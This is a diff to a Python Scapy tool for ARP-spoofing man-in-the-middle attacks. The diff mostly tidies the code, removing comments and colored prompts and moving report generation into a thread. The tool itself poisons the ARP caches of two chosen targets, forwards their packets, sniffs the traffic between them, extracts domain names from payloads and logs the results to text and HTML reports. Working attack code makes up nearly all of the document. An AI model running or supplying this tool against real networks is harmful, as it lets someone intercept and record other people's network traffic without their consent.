@@ -9,6 +9,7 @@ import time
 import re
 import threading
 import sys
+
 running = True
 
 def arpSpoof(target, spoofIp, iface):
@@ -19,7 +20,7 @@ def arpSpoof(target, spoofIp, iface):
         time.sleep(1)
 
 def forwardPacket(pkt, target1, target2, iface):
-     if pkt.haslayer(IP):
+    if pkt.haslayer(IP):
         sendp(pkt, iface=iface, verbose=False)
 
 def sniffAndForward(target1, target2, iface):
@@ -30,9 +31,12 @@ def startAttack(target1, target2, iface, report):
     # Start ARP poisoning threads
     threading.Thread(target=arpSpoof, args=(target1, target2, iface), daemon=True).start()
     threading.Thread(target=arpSpoof, args=(target2, target1, iface), daemon=True).start()
+
     # Start sniffing and forwarding packets
     if report == 1:
-        createReport(target1, target2, iface)
+        sniffThread = threading.Thread(target=createReport, args=(target1, target2, iface))
+        sniffThread.start()
+        sniffThread.join()  # Wait for sniffing and report generation to complete
     else:
         sniffAndForward(target1, target2, iface)
 
@@ -45,7 +49,6 @@ def createReport(target1, target2, iface):
         3306: "MySQL", 5432: "PostgreSQL"
     }
 
-    # Data aggregation structures
     protocolCount = {}
     domainSet = set()
     csvFilename = "sniffingData.txt"
@@ -55,18 +58,15 @@ def createReport(target1, target2, iface):
         csv_file.write("Protocols,Packet Summary\n")
 
     def extractDomains(payload):
-        # Simple regex for domain extraction
         pattern = r'(?i)\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b'
         return re.findall(pattern, payload)
 
     def getApplicationProtocol(packet):
         protocols = []
-        
-        # Check if packet is ICMP
+
         if packet.haslayer(ICMP):
             protocols.append("ICMP")
-        
-        # Check for TCP/UDP based on ports
+
         if packet.haslayer("TCP") or packet.haslayer("UDP"):
             sport = packet.sport
             dport = packet.dport
@@ -74,8 +74,7 @@ def createReport(target1, target2, iface):
                 protocols.append(applicationPorts[sport])
             if dport in applicationPorts:
                 protocols.append(applicationPorts[dport])
- 
-        # Analyze raw payload for protocol patterns and domain names
+
         if packet.haslayer("Raw"):
             payload = packet["Raw"].load.decode(errors="ignore").lower()
             domainsFound = extractDomains(payload)
@@ -104,18 +103,16 @@ def createReport(target1, target2, iface):
                 protocols.append("SNMP")
             if "dhcp" in payload or "discover" in payload:
                 protocols.append("DHCP")
-            # Additional protocol checks:
             if "smb" in payload:
                 protocols.append("SMB")
             if "rdp" in payload:
                 protocols.append("RDP")
             if "sip:" in payload:
                 protocols.append("SIP")
- 
+
         return protocols
-     
+
     def packetCallback(packet):
-        # Only process packets exchanged between target1 and target2
         if packet.haslayer(IP):
             src = packet[IP].src
             dst = packet[IP].dst
@@ -128,25 +125,20 @@ def createReport(target1, target2, iface):
             msg = f"Application Layer Protocols: {protocols} | Packet Summary: {summary}"
             print(msg)
 
-            # Append the protocols and summary to the CSV file
             with open(csvFilename, "a") as csv_file:
                 csv_file.write(f"{'|'.join(protocols)},{summary}\n")
 
-            # Update protocol counts for the report
             for proto in protocols:
                 protocolCount[proto] = protocolCount.get(proto, 0) + 1
 
+    print(f"\nSniffing packets between {target1} and {target2} on interface {iface}... Press Ctrl+C to stop and create a report.")
     try:
-        print(f"\nSniffing packets between {target1} and {target2} on interface {iface}... Press Ctrl+C to stop and create a report.")
-        time.sleep(1)
         sniff(iface=iface, filter="ip", prn=packetCallback, store=False, timeout=None)
     except KeyboardInterrupt:
         print("\nStopping packet sniffing.")
         generateHtmlReport(target1, target2, iface, protocolCount, domainSet, csvFilename)
-        running = False
-        
+
 def generateHtmlReport(target1, target2, iface, protocolCount, domainSet, csvFilename):
-    # Build the HTML report with inline CSS styling
     htmlContent = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -200,11 +192,9 @@ def generateHtmlReport(target1, target2, iface, protocolCount, domainSet, csvFil
     print("HTML report generated: report.html")
 
 def menu():
-    RED = "\033[38;2;255;0;0m"
-    RESET = "\033[0m"
-    target1 = input(f"{RED}\nTarget 1 IP address: {RESET}")
-    target2 = input(f"{RED}Target 2 IP address: {RESET}")
-    interface = input(f"{RED}Interface: {RESET}")
+    target1 = input("Target 1 IP address: ")
+    target2 = input("Target 2 IP address: ")
+    interface = input("Interface: ")
     while True:
         report = input("Want to create a report during the attack? [Y]es | [N]o: ")
         if report.lower() == "y":
@@ -214,9 +204,9 @@ def menu():
             break
         else:
             print("Invalid.")
-            
+
 def terminal():
-    parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
+    parser = argparse.ArgumentParser(description="ARP Spoofing")
     parser.add_argument("-t1", "--target1", required=True, help="Target 1 IP address.")
     parser.add_argument("-t2", "--target2", required=True, help="Target 2 IP address.")
     parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.")
